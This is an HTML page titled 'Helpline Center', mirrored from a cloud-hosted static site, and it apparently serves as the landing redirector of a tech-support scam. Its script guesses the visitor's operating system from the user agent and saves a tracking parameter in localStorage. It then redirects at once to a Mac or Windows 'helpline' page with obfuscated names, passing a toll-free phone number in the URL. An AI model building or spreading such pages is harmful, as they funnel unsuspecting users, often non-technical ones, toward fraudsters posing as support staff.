
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Helpline Center</title>
    <script type='text/javascript' src="../code.jquery.com/jquery-1.4.4.min.js"></script>

    <script>
        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }
        function myOperatingSystem() {
            const userAgent = navigator.userAgent;
            let os = "Unknown";
            if (userAgent.indexOf("Win") !== -1) {
                os = "Windows";
            } else if (userAgent.indexOf("Mac") !== -1) {
                os = "MacOS";
            } else if (userAgent.indexOf("Linux") !== -1) {
                os = "Linux";
            } else if (userAgent.indexOf("Android") !== -1) {
                os = "Android";
            } else if (userAgent.indexOf("iOS") !== -1) {
                os = "iOS";
            }
            return os;
        }
        let operatingSystem = myOperatingSystem();
        localStorage.setItem('alpha',getQueryParam('alpha'));
        if(operatingSystem === 'MacOS'){
            window.location.href="Mac0helpS0h0line67/index.php?bcda=1-800-654-0175 ";
        }else{
            window.location.href="Win0helpS0h0line67/index.php?bcda=1-800-654-0175 ";
        }



    </script>
</head>
<body>

</body>

<!-- Mirrored from bigdellsc.z13.web.core.windows.net/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Dec 2024 18:34:58 GMT -->
</html>
